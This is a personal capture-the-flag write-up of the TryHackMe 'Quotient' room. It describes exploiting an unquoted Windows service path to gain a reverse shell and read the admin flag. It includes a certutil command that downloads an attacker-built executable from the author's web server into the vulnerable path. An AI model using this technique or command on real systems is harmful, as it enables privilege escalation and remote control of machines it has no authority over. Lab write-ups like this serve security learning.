### Introduction
Link: https://tryhackme.com/room/quotient#
Created by: ben, JohnHammond, cmnatic, NightWolf, timtaylor
* * *
### Connecting
Pinging the IP address for this machine does not seem to resolve anything. I had to briefly look at another write-up to see if anyone else had issues. It seems RDP still works so I proceeded to simply connect to it and it worked.

![3cc90c64c1d1ac43d1aef70c73009f4e.png](../_resources/3cc90c64c1d1ac43d1aef70c73009f4e.png)
* * *
### Reconnaissance
Right away we can tell that this server is an AWS Instance being hosted in **eu-west-1b** and is a t2.medium EC2 instance. Not crucially important, but interesting to point out.

Let's see what kind of permissions we have as the user "Sage".

![658494285c75fb47f7e816ce2fc218a1.png](../_resources/658494285c75fb47f7e816ce2fc218a1.png)

It looks like we're not very special and only have general access.

![3dadeb6debd6380cdab64b97820bbbaa.png](../_resources/3dadeb6debd6380cdab64b97820bbbaa.png)

Let's have a look around and see what is on this computer. So far the only thing that really stands out is the folder **windows nt**. Normally the **W** would be capitalized, same with **NT**. Not sure why this was deliberately changed, but we will keep it in mind if anything else comes up.

![a0b61d9dd05b25eb245f52e170b292a1.png](../_resources/a0b61d9dd05b25eb245f52e170b292a1.png)

Nothing else stands out withing the folders, maybe we can see what services are running on the machine.

Everything looks normal except for one. It has no description and is misspelled.

![95562cfa26ee77ee2229ff38837c2efb.png](../_resources/95562cfa26ee77ee2229ff38837c2efb.png)

Let's investigate.

![0ada677f68c1d969a7520527e7a983c4.png](../_resources/0ada677f68c1d969a7520527e7a983c4.png)

At this point, I was a bit stuck and not sure how to proceed. Clearly there is something about this service that is meant to be exploited. 

I am learning that it is ok to be stuck, part of PenTesting is research. You are not going to know everything for every engagement and it is important to be able to find the answers we need on an as needed basis.

With the help of Google, I came across this article which seems to fit the exact situation we are in.

**Link:** https://vk9-sec.com/privilege-escalation-unquoted-service-path-windows/#:~:text=When%20a%20service%20is%20created,of%20the%20time%20it%20is).

### Exploitation

So we are dealing with an **Unquoted Service Path**, now the name of the room makes a little more sense.

According to the article above, we should create a payload and drop it into that file path. So let's create that payload.

![69003b3b6fa29e0ca5cd9b402cc1815c.png](../_resources/69003b3b6fa29e0ca5cd9b402cc1815c.png)

Now we need to start a web server on our Kali machine.

![7eed70e4cd3a5000fb4542483de44f67.png](../_resources/7eed70e4cd3a5000fb4542483de44f67.png)

And we need to download the executable from our target machine.

![e2c62b94d766594d957550f4eabbe889.png](../_resources/e2c62b94d766594d957550f4eabbe889.png)

Now, we need to have the machine run that service, but we lack the permissions to start/stop them, so a reboot will be required.

But first, gotta make sure NetCat is listening.

![e57fff9a846ab29bc1461d3146275646.png](../_resources/e57fff9a846ab29bc1461d3146275646.png)

Now, the wait begins...
...
...
...
...
Still nothing, maybe there is an issue with the server?
Server is back up, IP is the same, and the revshell.exe is still there. What went wrong?

Well, as it turns out, it's the name of the .exe. I did not read the article carefully and missed the part where it said that the .exe file needs to be named something similar to what is in the service path, .ie, Devservice.exe.

Let's start over real quick.

![d65e82940e2f358055650fc96fb76da2.png](../_resources/d65e82940e2f358055650fc96fb76da2.png)

That's better.
Now we'll download this on the target machine.

`certutil -urlcache -split -f “http://10.13.27.44:9999/Devservice.exe” Devservice.exe`

And reboot the target machine.
Now we once again wait on NetCat.

...

Got it...

![f314cea54ab81f3928c495244f3b2faa.png](../_resources/f314cea54ab81f3928c495244f3b2faa.png)
* * *
### Post-Exploitation

Time to search for that flag.txt file.

And it looks like it's right on the Admin Desktop.

![b9983bdb900bafc38d417afd67737caa.png](../_resources/b9983bdb900bafc38d417afd67737caa.png)
* * *
### Lessons Learned

READ!!!

I tend to skimp documentation to get to the good stuff, I was in a hurry to try out the exploit without taking my time to actually read how it works. But as they say, failure is a better teacher than success. This will be something that sticks with me.